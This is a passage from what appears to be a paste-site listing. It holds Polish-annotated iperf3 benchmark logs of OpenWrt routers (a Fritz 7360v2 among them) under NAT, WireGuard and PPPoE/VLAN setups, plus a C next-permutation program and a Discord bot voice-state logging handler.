[  5]   0.00-60.04  sec   669 MBytes  93.4 Mbits/sec   81             sender
[  5]   0.00-60.00  sec   666 MBytes  93.1 Mbits/sec                  receiver

iperf Done.

$ iperf3 -c 192.168.76.1 -i 60 -t 60 --bidir
Connecting to host 192.168.76.1, port 5201
[  5] local 192.168.1.3 port 46410 connected to 192.168.76.1 port 5201
[  7] local 192.168.1.3 port 46418 connected to 192.168.76.1 port 5201
[ ID][Role] Interval           Transfer     Bitrate         Retr  Cwnd
[  5][TX-C]   0.00-60.00  sec  1.38 GBytes   198 Mbits/sec   49    779 KBytes       
[  7][RX-C]   0.00-60.00  sec   298 MBytes  41.6 Mbits/sec                  
- - - - - - - - - - - - - - - - - - - - - - - - -
[ ID][Role] Interval           Transfer     Bitrate         Retr
[  5][TX-C]   0.00-60.00  sec  1.38 GBytes   198 Mbits/sec   49             sender
[  5][TX-C]   0.00-60.01  sec  1.38 GBytes   197 Mbits/sec                  receiver
[  7][RX-C]   0.00-60.00  sec   300 MBytes  41.9 Mbits/sec  319             sender
[  7][RX-C]   0.00-60.01  sec   298 MBytes  41.6 Mbits/sec                  receiver

iperf Done.

### WG + PPPoE + VLAN35 (z klienta LAN-owego, przez router który jest peerem WG i clientem PPPoE, do serwera WG który jest dodatkowo serwerem PPPoE na tagowanych portach VLAN 35) ###

$ iperf3 -c 10.9.0.1 -i 60 -t 60
Connecting to host 10.9.0.1, port 5201
[  5] local 192.168.1.3 port 53218 connected to 10.9.0.1 port 5201
[ ID] Interval           Transfer     Bitrate         Retr  Cwnd
[  5]   0.00-60.00  sec   543 MBytes  76.0 Mbits/sec    0   3.03 MBytes       
- - - - - - - - - - - - - - - - - - - - - - - - -
[ ID] Interval           Transfer     Bitrate         Retr
[  5]   0.00-60.00  sec   543 MBytes  76.0 Mbits/sec    0             sender
[  5]   0.00-60.23  sec   543 MBytes  75.7 Mbits/sec                  receiver

iperf Done.

$ iperf3 -c 10.9.0.1 -i 60 -t 60 -R
Connecting to host 10.9.0.1, port 5201
Reverse mode, remote host 10.9.0.1 is sending
[  5] local 192.168.1.3 port 59910 connected to 10.9.0.1 port 5201
[ ID] Interval           Transfer     Bitrate         Retr  Cwnd
[  5]   0.00-60.00  sec   695 MBytes  97.1 Mbits/sec                  
- - - - - - - - - - - - - - - - - - - - - - - - -
[ ID] Interval           Transfer     Bitrate         Retr
[  5]   0.00-60.02  sec   698 MBytes  97.6 Mbits/sec  450             sender
[  5]   0.00-60.00  sec   695 MBytes  97.1 Mbits/sec                  receiver

iperf Done.

$ iperf3 -c 10.9.0.1 -i 60 -t 60 --bidir
Connecting to host 10.9.0.1, port 5201
[  5] local 192.168.1.3 port 43114 connected to 10.9.0.1 port 5201
[  7] local 192.168.1.3 port 43126 connected to 10.9.0.1 port 5201
[ ID][Role] Interval           Transfer     Bitrate         Retr  Cwnd
[  5][TX-C]   0.00-60.00  sec   325 MBytes  45.5 Mbits/sec  1018   1.29 MBytes       
[  7][RX-C]   0.00-60.00  sec   281 MBytes  39.3 Mbits/sec                  
- - - - - - - - - - - - - - - - - - - - - - - - -
[ ID][Role] Interval           Transfer     Bitrate         Retr
[  5][TX-C]   0.00-60.00  sec   325 MBytes  45.5 Mbits/sec  1018             sender
[  5][TX-C]   0.00-60.25  sec   324 MBytes  45.1 Mbits/sec                  receiver
[  7][RX-C]   0.00-60.00  sec   285 MBytes  39.8 Mbits/sec  776             sender
[  7][RX-C]   0.00-60.25  sec   281 MBytes  39.2 Mbits/sec                  receiver

iperf Done.

####################################################################################################################

    ########## Z HW_NAT ##########

####################################################################################################################

### NAT (z klienta LAN-owego, przez router, do serwera) ###

$ iperf3 -c 192.168.76.1 -i 60 -t 60 
Connecting to host 192.168.76.1, port 5201
[  5] local 192.168.1.3 port 43120 connected to 192.168.76.1 port 5201
[ ID] Interval           Transfer     Bitrate         Retr  Cwnd
[  5]   0.00-60.00  sec  6.56 GBytes   938 Mbits/sec  11873    201 KBytes       
- - - - - - - - - - - - - - - - - - - - - - - - -
[ ID] Interval           Transfer     Bitrate         Retr
[  5]   0.00-60.00  sec  6.56 GBytes   938 Mbits/sec  11873             sender
[  5]   0.00-60.00  sec  6.55 GBytes   938 Mbits/sec                  receiver

iperf Done.

$ iperf3 -c 192.168.76.1 -i 60 -t 60 -R
Connecting to host 192.168.76.1, port 5201
Reverse mode, remote host 192.168.76.1 is sending
[  5] local 192.168.1.3 port 46682 connected to 192.168.76.1 port 5201
[ ID] Interval           Transfer     Bitrate         Retr  Cwnd
[  5]   0.00-60.00  sec  6.00 GBytes   859 Mbits/sec                  
- - - - - - - - - - - - - - - - - - - - - - - - -
[ ID] Interval           Transfer     Bitrate         Retr
[  5]   0.00-60.00  sec  6.00 GBytes   859 Mbits/sec    5             sender
[  5]   0.00-60.00  sec  6.00 GBytes   859 Mbits/sec                  receiver

iperf Done.

$ iperf3 -c 192.168.76.1 -i 60 -t 60 --bidir
Connecting to host 192.168.76.1, port 5201
[  5] local 192.168.1.3 port 35238 connected to 192.168.76.1 port 5201
[  7] local 192.168.1.3 port 35242 connected to 192.168.76.1 port 5201
[ ID][Role] Interval           Transfer     Bitrate         Retr  Cwnd
[  5][TX-C]   0.00-60.00  sec  5.14 GBytes   736 Mbits/sec  20927    324 KBytes       
[  7][RX-C]   0.00-60.00  sec  5.65 GBytes   809 Mbits/sec                  
- - - - - - - - - - - - - - - - - - - - - - - - -
[ ID][Role] Interval           Transfer     Bitrate         Retr
[  5][TX-C]   0.00-60.00  sec  5.14 GBytes   736 Mbits/sec  20927             sender
[  5][TX-C]   0.00-60.00  sec  5.14 GBytes   736 Mbits/sec                  receiver
[  7][RX-C]   0.00-60.00  sec  5.65 GBytes   810 Mbits/sec  155             sender
[  7][RX-C]   0.00-60.00  sec  5.65 GBytes   809 Mbits/sec                  receiver

iperf Done.

### WG (z klienta LAN-owego, przez router który jest peerem WG, do serwera WG) ###

$ iperf3 -c 10.9.0.1 -t 60 -i 60 
Connecting to host 10.9.0.1, port 5201
[  5] local 192.168.1.3 port 50428 connected to 10.9.0.1 port 5201
[ ID] Interval           Transfer     Bitrate         Retr  Cwnd
[  5]   0.00-60.00  sec   833 MBytes   116 Mbits/sec  453   1.56 MBytes       
- - - - - - - - - - - - - - - - - - - - - - - - -
[ ID] Interval           Transfer     Bitrate         Retr
[  5]   0.00-60.00  sec   833 MBytes   116 Mbits/sec  453             sender
[  5]   0.00-60.08  sec   831 MBytes   116 Mbits/sec                  receiver

iperf Done.

$ iperf3 -c 10.9.0.1 -t 60 -i 60 -R
Connecting to host 10.9.0.1, port 5201
Reverse mode, remote host 10.9.0.1 is sending
[  5] local 192.168.1.3 port 47134 connected to 10.9.0.1 port 5201
[ ID] Interval           Transfer     Bitrate         Retr  Cwnd
[  5]   0.00-60.00  sec   844 MBytes   118 Mbits/sec                  
- - - - - - - - - - - - - - - - - - - - - - - - -
[ ID] Interval           Transfer     Bitrate         Retr
[  5]   0.00-60.01  sec   846 MBytes   118 Mbits/sec  198             sender
[  5]   0.00-60.00  sec   844 MBytes   118 Mbits/sec                  receiver

iperf Done.

$ iperf3 -c 10.9.0.1 -t 60 -i 60 --bidir
Connecting to host 10.9.0.1, port 5201
[  5] local 192.168.1.3 port 56442 connected to 10.9.0.1 port 5201
[  7] local 192.168.1.3 port 56452 connected to 10.9.0.1 port 5201
[ ID][Role] Interval           Transfer     Bitrate         Retr  Cwnd
[  5][TX-C]   0.00-60.00  sec   383 MBytes  53.6 Mbits/sec  227    536 KBytes       
[  7][RX-C]   0.00-60.00  sec   459 MBytes  64.2 Mbits/sec                  
- - - - - - - - - - - - - - - - - - - - - - - - -
[ ID][Role] Interval           Transfer     Bitrate         Retr
[  5][TX-C]   0.00-60.00  sec   383 MBytes  53.6 Mbits/sec  227             sender
[  5][TX-C]   0.00-60.03  sec   382 MBytes  53.4 Mbits/sec                  receiver
[  7][RX-C]   0.00-60.00  sec   462 MBytes  64.6 Mbits/sec  371             sender
[  7][RX-C]   0.00-60.03  sec   459 MBytes  64.2 Mbits/sec                  receiver

iperf Done.

### PPPoE + VLAN 35(z klienta LAN-owego, przez router który jest clientem PPPoE, do serwera PPPoE dodatkowo na tagowanych portach VLAN 35) ###

$ iperf3 -c 192.168.76.1 -i 60 -t 60
Connecting to host 192.168.76.1, port 5201
[  5] local 192.168.1.3 port 56126 connected to 192.168.76.1 port 5201
[ ID] Interval           Transfer     Bitrate         Retr  Cwnd
[  5]   0.00-60.00  sec  6.52 GBytes   934 Mbits/sec  104    650 KBytes       
- - - - - - - - - - - - - - - - - - - - - - - - -
[ ID] Interval           Transfer     Bitrate         Retr
[  5]   0.00-60.00  sec  6.52 GBytes   934 Mbits/sec  104             sender
[  5]   0.00-60.01  sec  6.52 GBytes   933 Mbits/sec                  receiver

iperf Done.

$ iperf3 -c 192.168.76.1 -i 60 -t 60 -R
Connecting to host 192.168.76.1, port 5201
Reverse mode, remote host 192.168.76.1 is sending
[  5] local 192.168.1.3 port 58690 connected to 192.168.76.1 port 5201
[ ID] Interval           Transfer     Bitrate         Retr  Cwnd
[  5]   0.00-60.00  sec  6.52 GBytes   934 Mbits/sec                  
- - - - - - - - - - - - - - - - - - - - - - - - -
[ ID] Interval           Transfer     Bitrate         Retr
[  5]   0.00-60.00  sec  6.52 GBytes   934 Mbits/sec  102             sender
[  5]   0.00-60.00  sec  6.52 GBytes   934 Mbits/sec                  receiver

iperf Done.

$ iperf3 -c 192.168.76.1 -i 60 -t 60 --bidir
Connecting to host 192.168.76.1, port 5201
[  5] local 192.168.1.3 port 55804 connected to 192.168.76.1 port 5201
[  7] local 192.168.1.3 port 55812 connected to 192.168.76.1 port 5201
[ ID][Role] Interval           Transfer     Bitrate         Retr  Cwnd
[  5][TX-C]   0.00-60.00  sec  6.02 GBytes   862 Mbits/sec  5992    325 KBytes       
[  7][RX-C]   0.00-60.00  sec  4.91 GBytes   703 Mbits/sec                  
- - - - - - - - - - - - - - - - - - - - - - - - -
[ ID][Role] Interval           Transfer     Bitrate         Retr
[  5][TX-C]   0.00-60.00  sec  6.02 GBytes   862 Mbits/sec  5992             sender
[  5][TX-C]   0.00-60.00  sec  6.01 GBytes   861 Mbits/sec                  receiver
[  7][RX-C]   0.00-60.00  sec  4.92 GBytes   704 Mbits/sec  893             sender
[  7][RX-C]   0.00-60.00  sec  4.91 GBytes   703 Mbits/sec                  receiver

iperf Done.

### WG + PPPoE + VLAN35 (z klienta LAN-owego, przez router który jest peerem WG i clientem PPPoE, do serwera WG który jest dodatkowo serwerem PPPoE na tagowanych portach VLAN 35) ###

$ iperf3 -c 10.9.0.1 -i 60 -t 60 
Connecting to host 10.9.0.1, port 5201
[  5] local 192.168.1.3 port 37228 connected to 10.9.0.1 port 5201
[ ID] Interval           Transfer     Bitrate         Retr  Cwnd
[  5]   0.00-60.00  sec   418 MBytes  58.5 Mbits/sec    0   3.00 MBytes       
- - - - - - - - - - - - - - - - - - - - - - - - -
[ ID] Interval           Transfer     Bitrate         Retr
[  5]   0.00-60.00  sec   418 MBytes  58.5 Mbits/sec    0             sender
[  5]   0.00-60.25  sec   418 MBytes  58.2 Mbits/sec                  receiver

iperf Done.

$ iperf3 -c 10.9.0.1 -i 60 -t 60 -R
Connecting to host 10.9.0.1, port 5201
Reverse mode, remote host 10.9.0.1 is sending
[  5] local 192.168.1.3 port 35210 connected to 10.9.0.1 port 5201
[ ID] Interval           Transfer     Bitrate         Retr  Cwnd
[  5]   0.00-60.00  sec   708 MBytes  99.0 Mbits/sec                  
- - - - - - - - - - - - - - - - - - - - - - - - -
[ ID] Interval           Transfer     Bitrate         Retr
[  5]   0.00-60.08  sec   713 MBytes  99.5 Mbits/sec  112             sender
[  5]   0.00-60.00  sec   708 MBytes  99.0 Mbits/sec                  receiver

iperf Done.

$ iperf3 -c 10.9.0.1 -i 60 -t 60 --bidir
Connecting to host 10.9.0.1, port 5201
[  5] local 192.168.1.3 port 46732 connected to 10.9.0.1 port 5201
[  7] local 192.168.1.3 port 46734 connected to 10.9.0.1 port 5201
[ ID][Role] Interval           Transfer     Bitrate         Retr  Cwnd
[  5][TX-C]   0.00-60.00  sec   223 MBytes  31.2 Mbits/sec  1222   1.08 MBytes       
[  7][RX-C]   0.00-60.00  sec   272 MBytes  38.0 Mbits/sec                  
- - - - - - - - - - - - - - - - - - - - - - - - -
[ ID][Role] Interval           Transfer     Bitrate         Retr
[  5][TX-C]   0.00-60.00  sec   223 MBytes  31.2 Mbits/sec  1222             sender
[  5][TX-C]   0.00-60.27  sec   222 MBytes  30.8 Mbits/sec                  receiver
[  7][RX-C]   0.00-60.00  sec   276 MBytes  38.5 Mbits/sec  2051             sender
[  7][RX-C]   0.00-60.27  sec   272 MBytes  37.8 Mbits/sec                  receiver

iperf Done."
NSdxDcYj,Next permutation,UnuLaTrei,C,Sunday 31st of March 2024 02:35:31 PM CDT,"#include <stdio.h>

#define PRINT

void swap(int* a, int* b)
{
	int temp = *a;
	*a = *b;
	*b = temp;
}

void insertion_sort(int arr[], int size)
{
	for(int ins = 1; ins < size; ins++)
	{
		for(int i = 0; i < ins; i++)
		{
			if(arr[i] > arr[ins])
			{
				int temp = arr[ins];
				
				for(int j = ins-1; j >= i; j--)
					arr[j+1] = arr[j];
					
				arr[i] = temp;
				
				break;
			}
		}
	}
}

void next_perm(int arr[], int size)
{
	if(size >= 2)
	{
		int replacee = size-2;
		while(arr[replacee] >= arr[replacee+1])
		{
			replacee--;
			if(replacee < 0)
				break;
		}
		
		int replacer = replacee+1;
		for(int i = replacer+1; i < size; i++)
			if(arr[i] > arr[replacee] && arr[i] < arr[replacer])
				replacer = i;
		
		swap(arr+replacee, arr+replacer);
		
		insertion_sort(arr+replacee+1, size-replacee-1);
		
#ifdef PRINT
		for(int i = 0; i < size; i++)
			printf(""%d "", arr[i]);
		printf(""\n"");
#endif
	}
}

int main()
{
	int arr[] = {1,2,3,4,5};
	int size = sizeof(arr)/sizeof(int);
	
	int n_perms = 1;
	for(int i = 2; i <= size; i++)
		n_perms *= i;
	
	for(int i = 0; i < n_perms; i++)
		next_perm(arr,size);
}"
xZbzXKuL,..?,tomtomvader298,JavaScript,Sunday 31st of March 2024 02:32:43 PM CDT,"//Check If User Joins/Leave/Changes/Muted/Deafened 
client.on('voiceStateUpdate', async (oldState, newState) => {
  console.log(`voiceStateUpdate: ${oldState.channel} ${oldState.member} ${newState.channel} ${newState.member}`);
  const guildID = oldState.guild.id; // Grab GuildID From The Member Atrib
  const loggedLoggingChannelId = await db.get(`loggedlogschannel_${guildID}`) || [];
  const loggingChannelIdIndex = loggedLoggingChannelId.findIndex(entry => entry.name === ""Channel"");
  let loggerChannelId;

  if (loggingChannelIdIndex !== -1) {
    loggerChannelId = loggedLoggingChannelId[loggingChannelIdIndex].value;
  } else {
    return;
  }

  // Construct the message content with information about Member Updates (Vc Join/Leave/Muted/Deafened)
  let messageContent = '';

  // Check if the member joined a voice channel
  if (!oldState.channel && newState.channel) {
    messageContent += `${newState.member} joined voice channel ${newState.channel}`
    console.log(`${newState.member} joined voice channel ${newState.channel}`);
  }

  // Check if the member left a voice channel
  if (oldState.channel && !newState.channel) {
    messageContent += `${oldState.member} left voice channel ${oldState.channel}`
    console.log(`${oldState.member} left voice channel ${oldState.channel}`);
  }

  // Check if the member switched voice channels
  if (oldState.channel && newState.channel && oldState.channel !== newState.channel) {
    messageContent += `${newState.member} switched from voice channel ${oldState.channel} to ${newState.channel}`
    console.log(`${newState.member} switched from voice channel ${oldState.channel} to ${newState.channel}`);
  }

  // Check if the member was muted or deafened
  if (oldState.serverMute !== newState.serverMute || oldState.serverDeaf !== newState.serverDeaf) {
    if (newState.serverMute) {
      messageContent += `${newState.member} was server muted in voice channel ${newState.channel.name}`
      console.log(`${newState.member} was server muted in voice channel ${newState.channel.name}`);
    } else {
      messageContent += `${newState.member} was unmuted in voice channel ${newState.channel.name}`;
      console.log(`${newState.member} was unmuted in voice channel ${newState.channel.name}`);
    }

    if (newState.serverDeaf) {
      messageContent += `${newState.member} was server deafened in voice channel ${newState.channel.name}`
      console.log(`${newState.member} was server deafened in voice channel ${newState.channel.name}`);
    } else {
      messageContent += `${newState.member} was undeafened in voice channel ${newState.channel.name}`;
      console.log(`${newState.member} was undeafened in voice channel ${newState.channel.name}`);
    }
  }

  // Check if Member self mutes/deafans
  if (oldState.selfMute !== newState.selfMute || oldState.selfDeaf !== newState.selfDeaf) {
    if (newState.selfMute) {
      messageContent += `${newState.member} has muted in voice channel ${newState.channel.name}`
      console.log(`${newState.member} has muted in voice channel ${newState.channel.name}`);
    } else {
      messageContent += `${newState.member} has unmuted in voice channel ${newState.channel.name}`;
      console.log(`${newState.member} has unmuted in voice channel ${newState.channel.name}`);
    }

    if (newState.selfDeaf) {
      messageContent += `${newState.member} has deafened in voice channel ${newState.channel.name}`
      console.log(`${newState.member} has deafened in voice channel ${newState.channel.name}`);
    } else {
      messageContent += `${newState.member} has undeafened in voice channel ${newState.channel.name}`;
      console.log(`${newState.member} has undeafened in voice channel ${newState.channel.name}`);
    }
  }
  
  if (oldState.streaming !== newState.streaming) {
    if (newState.streaming) {
      messageContent += `${newState.member} has gone live in voice channel ${newState.channel.name}`
      console.log(`${newState.member} has gone live in voice channel ${newState.channel.name}`);
    } else {
      messageContent += `${newState.member} has ended their stream in voice channel ${newState.channel.name}`;
      console.log(`${newState.member} has ended their stream in voice channel ${newState.channel.name}`);
    }
  }
console.log(oldState, newState)
  await client.guilds.cache.get(guildID).channels.cache.get(loggerChannelId).send({ content: `Voice Channel Activity Detected:\n${messageContent}`, embeds: [], files: [] });
});"
277tzK3H,Fritz 7360v2 (xrx200),mar_w,Bash,Sunday 31st of March 2024 02:31:58 PM CDT,"  _______                     ________        __
 |       |.-----.-----.-----.|  |  |  |.----.|  |_
 |   -   ||  _  |  -__|     ||  |  |  ||   _||   _|
 |_______||   __|_____|__|__||________||__|  |____|
          |__| W I R E L E S S   F R E E D O M
 -----------------------------------------------------
 OpenWrt 23.05.3, r23809-234f1a2efa
 -----------------------------------------------------

#######################################################################################################

    ############### Bez HW_NAT ###############

#######################################################################################################

### NAT: (z klienta LAN-owego przez router do serwera) ###
CPU0: 100%   CPU1: 6,2-7,4%

$ iperf3 -c 192.168.76.1 -i 60 -t 60 
Connecting to host 192.168.76.1, port 5201
[  5] local 192.168.1.3 port 39706 connected to 192.168.76.1 port 5201
[ ID] Interval           Transfer     Bitrate         Retr  Cwnd
[  5]   0.00-60.00  sec   945 MBytes   132 Mbits/sec  104    250 KBytes       
- - - - - - - - - - - - - - - - - - - - - - - - -
[ ID] Interval           Transfer     Bitrate         Retr
[  5]   0.00-60.00  sec   945 MBytes   132 Mbits/sec  104             sender
[  5]   0.00-60.01  sec   943 MBytes   132 Mbits/sec                  receiver

iperf Done.

$ iperf3 -c 192.168.76.1 -i 60 -t 60 -R
Connecting to host 192.168.76.1, port 5201
Reverse mode, remote host 192.168.76.1 is sending
[  5] local 192.168.1.3 port 60962 connected to 192.168.76.1 port 5201
[ ID] Interval           Transfer     Bitrate         Retr  Cwnd
[  5]   0.00-60.00  sec  1011 MBytes   141 Mbits/sec                  
- - - - - - - - - - - - - - - - - - - - - - - - -
[ ID] Interval           Transfer     Bitrate         Retr
[  5]   0.00-60.01  sec  1013 MBytes   142 Mbits/sec  125             sender
[  5]   0.00-60.00  sec  1011 MBytes   141 Mbits/sec                  receiver

iperf Done.

$ iperf3 -c 192.168.76.1 -i 60 -t 60 --bidir
Connecting to host 192.168.76.1, port 5201
[  5] local 192.168.1.3 port 52256 connected to 192.168.76.1 port 5201
[  7] local 192.168.1.3 port 52260 connected to 192.168.76.1 port 5201
[ ID][Role] Interval           Transfer     Bitrate         Retr  Cwnd
[  5][TX-C]   0.00-60.00  sec   576 MBytes  80.5 Mbits/sec  151    174 KBytes       
[  7][RX-C]   0.00-60.00  sec   375 MBytes  52.4 Mbits/sec                  
- - - - - - - - - - - - - - - - - - - - - - - - -
[ ID][Role] Interval           Transfer     Bitrate         Retr
[  5][TX-C]   0.00-60.00  sec   576 MBytes  80.5 Mbits/sec  151             sender
[  5][TX-C]   0.00-60.01  sec   574 MBytes  80.3 Mbits/sec                  receiver
[  7][RX-C]   0.00-60.00  sec   376 MBytes  52.5 Mbits/sec  244             sender
[  7][RX-C]   0.00-60.01  sec   375 MBytes  52.4 Mbits/sec                  receiver

iperf Done.

### WG (z klienta LAN-owego, przez router który jest peerem WG, do serwera WG) ###
CPU0: 100%   CPU1: 47-80% (czy z -R czy bez)

$ iperf3 -c 10.9.0.1 -i 60 -t 60 
Connecting to host 10.9.0.1, port 5201
[  5] local 192.168.1.3 port 49888 connected to 10.9.0.1 port 5201
[ ID] Interval           Transfer     Bitrate         Retr  Cwnd
[  5]   0.00-60.00  sec   218 MBytes  30.5 Mbits/sec  703    291 KBytes       
- - - - - - - - - - - - - - - - - - - - - - - - -
[ ID] Interval           Transfer     Bitrate         Retr
[  5]   0.00-60.00  sec   218 MBytes  30.5 Mbits/sec  703             sender
[  5]   0.00-60.03  sec   215 MBytes  30.0 Mbits/sec                  receiver

iperf Done.

$ iperf3 -c 10.9.0.1 -i 60 -t 60 -R
Connecting to host 10.9.0.1, port 5201
Reverse mode, remote host 10.9.0.1 is sending
[  5] local 192.168.1.3 port 60102 connected to 10.9.0.1 port 5201
[ ID] Interval           Transfer     Bitrate         Retr  Cwnd
[  5]   0.00-60.00  sec   357 MBytes  50.0 Mbits/sec                  
- - - - - - - - - - - - - - - - - - - - - - - - -
[ ID] Interval           Transfer     Bitrate         Retr
[  5]   0.00-60.03  sec   360 MBytes  50.3 Mbits/sec  146             sender
[  5]   0.00-60.00  sec   357 MBytes  50.0 Mbits/sec                  receiver

iperf Done.

$ iperf3 -c 10.9.0.1 -i 60 -t 60 --bidir
Connecting to host 10.9.0.1, port 5201
[  5] local 192.168.1.3 port 49884 connected to 10.9.0.1 port 5201
[  7] local 192.168.1.3 port 49894 connected to 10.9.0.1 port 5201
[ ID][Role] Interval           Transfer     Bitrate         Retr  Cwnd
[  5][TX-C]   0.00-60.00  sec  55.5 MBytes  7.77 Mbits/sec  321   57.4 KBytes       
[  7][RX-C]   0.00-60.00  sec   288 MBytes  40.3 Mbits/sec                  
- - - - - - - - - - - - - - - - - - - - - - - - -
[ ID][Role] Interval           Transfer     Bitrate         Retr
[  5][TX-C]   0.00-60.00  sec  55.5 MBytes  7.77 Mbits/sec  321             sender
[  5][TX-C]   0.00-60.03  sec  55.0 MBytes  7.69 Mbits/sec                  receiver
[  7][RX-C]   0.00-60.00  sec   291 MBytes  40.7 Mbits/sec   65             sender
[  7][RX-C]   0.00-60.03  sec   288 MBytes  40.3 Mbits/sec                  receiver

iperf Done.

### PPPoE + VLAN 35(z klienta LAN-owego, przez router który jest clientem PPPoE, do serwera PPPoE, dodatkowo na tagowanych portach VLAN 35) ####
CPU0: 100%   CPU1: 6,8-7,4%

$ iperf3 -c 192.168.76.1 -i 60 -t 60 
Connecting to host 192.168.76.1, port 5201
[  5] local 192.168.1.3 port 49812 connected to 192.168.76.1 port 5201
[ ID] Interval           Transfer     Bitrate         Retr  Cwnd
[  5]   0.00-60.00  sec   588 MBytes  82.2 Mbits/sec   32    367 KBytes       
- - - - - - - - - - - - - - - - - - - - - - - - -
[ ID] Interval           Transfer     Bitrate         Retr
[  5]   0.00-60.00  sec   588 MBytes  82.2 Mbits/sec   32             sender
[  5]   0.00-60.02  sec   586 MBytes  81.9 Mbits/sec                  receiver

iperf Done.

$ iperf3 -c 192.168.76.1 -i 60 -t 60 -R
Connecting to host 192.168.76.1, port 5201
Reverse mode, remote host 192.168.76.1 is sending
[  5] local 192.168.1.3 port 60782 connected to 192.168.76.1 port 5201
[ ID] Interval           Transfer     Bitrate         Retr  Cwnd
[  5]   0.00-60.00  sec   522 MBytes  72.9 Mbits/sec                  
- - - - - - - - - - - - - - - - - - - - - - - - -
[ ID] Interval           Transfer     Bitrate         Retr
[  5]   0.00-60.02  sec   524 MBytes  73.2 Mbits/sec   98             sender
[  5]   0.00-60.00  sec   522 MBytes  72.9 Mbits/sec                  receiver

iperf Done.

$ iperf3 -c 192.168.76.1 -i 60 -t 60 --bidir
Connecting to host 192.168.76.1, port 5201
[  5] local 192.168.1.3 port 45124 connected to 192.168.76.1 port 5201
[  7] local 192.168.1.3 port 45136 connected to 192.168.76.1 port 5201
[ ID][Role] Interval           Transfer     Bitrate         Retr  Cwnd
[  5][TX-C]   0.00-60.00  sec   125 MBytes  17.5 Mbits/sec  275   11.2 KBytes       
[  7][RX-C]   0.00-60.00  sec   413 MBytes  57.7 Mbits/sec                  
- - - - - - - - - - - - - - - - - - - - - - - - -
[ ID][Role] Interval           Transfer     Bitrate         Retr
[  5][TX-C]   0.00-60.00  sec   125 MBytes  17.5 Mbits/sec  275             sender
[  5][TX-C]   0.00-60.02  sec   124 MBytes  17.3 Mbits/sec                  receiver
[  7][RX-C]   0.00-60.00  sec   415 MBytes  58.1 Mbits/sec  256             sender
[  7][RX-C]   0.00-60.02  sec   413 MBytes  57.7 Mbits/sec                  receiver

iperf Done.

### WG + PPPoE + VLAN35 (z klienta LAN-owego, przez router który jest peerem WG i clientem PPPoE, do serwera WG który jest dodatkowo serwerem PPPoE na tagowanych portach VLAN 35) ###
CPU0: 100%   CPU1: 40-68%

$ iperf3 -c 10.9.0.1 -i 60 -t 60 
Connecting to host 10.9.0.1, port 5201
[  5] local 192.168.1.3 port 37830 connected to 10.9.0.1 port 5201
[ ID] Interval           Transfer     Bitrate         Retr  Cwnd
[  5]   0.00-60.00  sec   143 MBytes  20.0 Mbits/sec  529    906 KBytes       
- - - - - - - - - - - - - - - - - - - - - - - - -
[ ID] Interval           Transfer     Bitrate         Retr
[  5]   0.00-60.00  sec   143 MBytes  20.0 Mbits/sec  529             sender
[  5]   0.00-60.46  sec   141 MBytes  19.6 Mbits/sec                  receiver

iperf Done.

$ iperf3 -c 10.9.0.1 -i 60 -t 60 -R
Connecting to host 10.9.0.1, port 5201
Reverse mode, remote host 10.9.0.1 is sending
[  5] local 192.168.1.3 port 46956 connected to 10.9.0.1 port 5201
[ ID] Interval           Transfer     Bitrate         Retr  Cwnd
[  5]   0.00-60.00  sec   281 MBytes  39.3 Mbits/sec                  
- - - - - - - - - - - - - - - - - - - - - - - - -
[ ID] Interval           Transfer     Bitrate         Retr
[  5]   0.00-60.04  sec   283 MBytes  39.5 Mbits/sec  144             sender
[  5]   0.00-60.00  sec   281 MBytes  39.3 Mbits/sec                  receiver

iperf Done.

$ iperf3 -c 10.9.0.1 -i 60 -t 60 --bidir
Connecting to host 10.9.0.1, port 5201
[  5] local 192.168.1.3 port 60108 connected to 10.9.0.1 port 5201
[  7] local 192.168.1.3 port 60114 connected to 10.9.0.1 port 5201
[ ID][Role] Interval           Transfer     Bitrate         Retr  Cwnd
[  5][TX-C]   0.00-60.00  sec  94.9 MBytes  13.3 Mbits/sec  124    123 KBytes       
[  7][RX-C]   0.00-60.00  sec   151 MBytes  21.1 Mbits/sec                  
- - - - - - - - - - - - - - - - - - - - - - - - -
[ ID][Role] Interval           Transfer     Bitrate         Retr
[  5][TX-C]   0.00-60.00  sec  94.9 MBytes  13.3 Mbits/sec  124             sender
[  5][TX-C]   0.00-60.04  sec  94.5 MBytes  13.2 Mbits/sec                  receiver
[  7][RX-C]   0.00-60.00  sec   153 MBytes  21.3 Mbits/sec  126             sender
[  7][RX-C]   0.00-60.04  sec   151 MBytes  21.1 Mbits/sec                  receiver

iperf Done.

###################################################################################################################

    ############### Z HW_NAT ###############

###################################################################################################################

### NAT (z klienta LAN-owego, do serwera przez router) ###
CPU0: 100%   CPU1: 6,8-8,5%

$ iperf3 -c 192.168.76.1 -i 60 -t 60 
Connecting to host 192.168.76.1, port 5201
[  5] local 192.168.1.3 port 33444 connected to 192.168.76.1 port 5201
[ ID] Interval           Transfer     Bitrate         Retr  Cwnd
[  5]   0.00-60.00  sec  2.87 GBytes   411 Mbits/sec  138    344 KBytes       
- - - - - - - - - - - - - - - - - - - - - - - - -
[ ID] Interval           Transfer     Bitrate         Retr
[  5]   0.00-60.00  sec  2.87 GBytes   411 Mbits/sec  138             sender
[  5]   0.00-60.00  sec  2.87 GBytes   411 Mbits/sec                  receiver

iperf Done.

$ iperf3 -c 192.168.76.1 -i 60 -t 60 -R
Connecting to host 192.168.76.1, port 5201
Reverse mode, remote host 192.168.76.1 is sending
[  5] local 192.168.1.3 port 55300 connected to 192.168.76.1 port 5201
[ ID] Interval           Transfer     Bitrate         Retr  Cwnd
[  5]   0.00-60.00  sec  2.89 GBytes   414 Mbits/sec                  
- - - - - - - - - - - - - - - - - - - - - - - - -
[ ID] Interval           Transfer     Bitrate         Retr
[  5]   0.00-60.00  sec  2.89 GBytes   414 Mbits/sec  234             sender
[  5]   0.00-60.00  sec  2.89 GBytes   414 Mbits/sec                  receiver

iperf Done.

$ iperf3 -c 192.168.76.1 -i 60 -t 60 --bidir
Connecting to host 192.168.76.1, port 5201
[  5] local 192.168.1.3 port 40872 connected to 192.168.76.1 port 5201
[  7] local 192.168.1.3 port 40884 connected to 192.168.76.1 port 5201
[ ID][Role] Interval           Transfer     Bitrate         Retr  Cwnd
[  5][TX-C]   0.00-60.00  sec  1.31 GBytes   187 Mbits/sec  451    137 KBytes       
[  7][RX-C]   0.00-60.00  sec  1.55 GBytes   221 Mbits/sec                  
- - - - - - - - - - - - - - - - - - - - - - - - -
[ ID][Role] Interval           Transfer     Bitrate         Retr
[  5][TX-C]   0.00-60.00  sec  1.31 GBytes   187 Mbits/sec  451             sender
[  5][TX-C]   0.00-60.00  sec  1.30 GBytes   187 Mbits/sec                  receiver
